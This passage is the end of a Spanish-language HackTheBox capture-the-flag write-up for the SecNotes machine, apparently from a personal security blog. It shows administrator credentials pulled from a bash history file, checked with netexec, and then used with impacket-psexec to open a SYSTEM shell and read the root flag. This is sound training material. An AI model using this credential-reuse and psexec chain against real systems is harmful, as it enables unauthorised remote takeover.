</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#fff;font-weight:bold">pwd
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="color:#fff;font-weight:bold"></span>mkdir filesystem
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span><span style="color:#fff;font-weight:bold">mount </span>//<span style="color:#ff0;font-weight:bold">127.0</span>.0.<span style="color:#ff0;font-weight:bold">1</span>/c$ filesystem/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>sudo apt install <span style="color:#fff;font-weight:bold">cifs-utils</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span><span style="color:#fff;font-weight:bold">mount </span>//<span style="color:#ff0;font-weight:bold">127.0</span>.0.<span style="color:#ff0;font-weight:bold">1</span>/c$ filesystem/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span><span style="color:#fff;font-weight:bold">mount </span>//<span style="color:#ff0;font-weight:bold">127.0</span>.0.<span style="color:#ff0;font-weight:bold">1</span>/c$ filesystem/ -o user=administrator
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span><span style="color:#fff;font-weight:bold">cat </span>/proc/filesystems
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>sudo modprobe cifs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>smbclient
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>apt install smbclient
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>smbclient
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>smbclient -U <span style="color:#0ff;font-weight:bold">&#39;administrator%u6!4ZwgwOM#^OBf#Nwnh&#39;</span> \\\\<span style="color:#ff0;font-weight:bold">127.0</span>.0.<span style="color:#ff0;font-weight:bold">1</span>\\c$
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>&gt; .bash_history 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>less .bash_history
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>exit</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>smbclient -U <span style="color:#0ff;font-weight:bold">&#39;administrator%u6!4ZwgwOM#^OBf#Nwnh&#39;</span> <span style="color:#0ff;font-weight:bold">\\\\</span>127.0.0.1<span style="color:#0ff;font-weight:bold">\\</span>c$</span></span></code></pre></div>
<p>Parecen credenciales del administrador del sistema.</p>
<p>Las podemos comprobar con <code>netexec</code> y son válidas.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ nxc smb 10.129.18.0 -u Administrator -p <span style="color:#0ff;font-weight:bold">&#39;u6!4ZwgwOM#^OBf#Nwnh&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>SMB         10.129.18.0     <span style="color:#ff0;font-weight:bold">445</span>    SECNOTES         [*] Windows <span style="color:#ff0;font-weight:bold">10</span> Enterprise <span style="color:#ff0;font-weight:bold">17134</span> (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>SMB         10.129.18.0     <span style="color:#ff0;font-weight:bold">445</span>    SECNOTES         [+] SECNOTES<span style="color:#0ff;font-weight:bold">\A</span>dministrator:u6!4ZwgwOM#^OBf#Nwnh (Pwn3d!)</span></span></code></pre></div>
<p>Para terminar, teniendo estas credenciales y con <code>psexec</code> podemos ganar una consola como <code>nt authority\system</code>.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ impacket-psexec -target-ip 10.129.18.0 Administrator:<span style="color:#0ff;font-weight:bold">&#39;u6!4ZwgwOM#^OBf#Nwnh&#39;</span>@10.129.18.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Impacket v0.11.0 - Copyright <span style="color:#ff0;font-weight:bold">2023</span> Fortra
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>[*] Requesting shares on 10.129.18.0.....
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>[*] Found writable share ADMIN$
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>[*] Uploading file pNVSROjb.exe
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>[*] Opening SVCManager on 10.129.18.0.....
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>[*] Creating service vyBL on 10.129.18.0.....
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>[*] Starting service vyBL.....
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>[!] Press <span style="color:#fff;font-weight:bold">help</span> <span style="color:#fff;font-weight:bold">for</span> extra shell commands
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>Microsoft Windows [Version 10.0.17134.228]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>(c) <span style="color:#ff0;font-weight:bold">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>C:<span style="color:#0ff;font-weight:bold">\W</span>INDOWS<span style="color:#0ff;font-weight:bold">\s</span>ystem32&gt; whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>nt authority<span style="color:#0ff;font-weight:bold">\s</span>ystem</span></span></code></pre></div>
<p>Podríamos leer la flag de <code>root</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:\Users\Administrator\Desktop&gt; <span style="color:#fff;font-weight:bold">type </span>root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>79da3473ede54ef8...</span></span></code></pre></div>
<p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

  </content>
  <p>
    
      <a href="/tags/hackthebox/">#HackTheBox</a>&nbsp;&nbsp;
    
      <a href="/tags/secnotes/">#SecNotes</a>&nbsp;&nbsp;
    
      <a href="/tags/writeup/">#Writeup</a>&nbsp;&nbsp;
    
      <a href="/tags/cybersecurity/">#Cybersecurity</a>&nbsp;&nbsp;
    
      <a href="/tags/penetration-testing/">#Penetration Testing</a>&nbsp;&nbsp;
    
      <a href="/tags/ctf/">#CTF</a>&nbsp;&nbsp;
    
      <a href="/tags/reverse-shell/">#Reverse Shell</a>&nbsp;&nbsp;
    
      <a href="/tags/privilege-escalation/">#Privilege Escalation</a>&nbsp;&nbsp;
    
      <a href="/tags/rce/">#RCE</a>&nbsp;&nbsp;
    
      <a href="/tags/exploit/">#Exploit</a>&nbsp;&nbsp;
    
      <a href="/tags/linux/">#Linux</a>&nbsp;&nbsp;
    
      <a href="/tags/xss/">#XSS</a>&nbsp;&nbsp;
    
      <a href="/tags/reflected-xss/">#Reflected XSS</a>&nbsp;&nbsp;
    
      <a href="/tags/stored-xss/">#Stored XSS</a>&nbsp;&nbsp;
    
      <a href="/tags/http-method-confusion/">#HTTP Method Confusion</a>&nbsp;&nbsp;
    
      <a href="/tags/csrf/">#CSRF</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-wsl/">#Abusing WSL</a>&nbsp;&nbsp;
    
      <a href="/tags/information-leakage/">#Information Leakage</a>&nbsp;&nbsp;
    
  </p>

    </main>
    <footer>
      
  <span>© 2024 pointedsec</span>



    </footer>

    
</body>
</html>
